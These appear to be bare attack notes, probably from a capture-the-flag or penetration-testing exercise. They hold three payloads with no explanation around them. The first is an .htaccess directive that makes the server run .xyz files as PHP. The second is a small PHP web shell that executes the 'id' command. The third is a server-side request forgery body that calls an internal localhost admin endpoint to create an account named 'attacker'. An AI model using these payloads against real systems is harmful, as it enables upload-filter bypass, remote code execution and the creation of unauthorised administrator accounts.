.htaccess : AddType application/x-httpd-php .xyz

shell: 
        <?php
        define('CMD' , 'id');
        
        echo '<pre>' . exec(CMD) .'<pre>' ;
        
        ?>


csrfmiddlewaretoken=zYm4zMmaGVeYybrVlRusjVTyPoBNlR7m1pnfURIZugwEDrXgkLPLoTpnUpdmRlRj&url=http%3A%2F%2Flocalhost%3A30000%2Fv1%2Fadmin%2Fadduser%3Fusername%3Dattacker%26userid%3D56456%26email%3Dattacker.com%26phone%3D1111111%26password%3Dpass
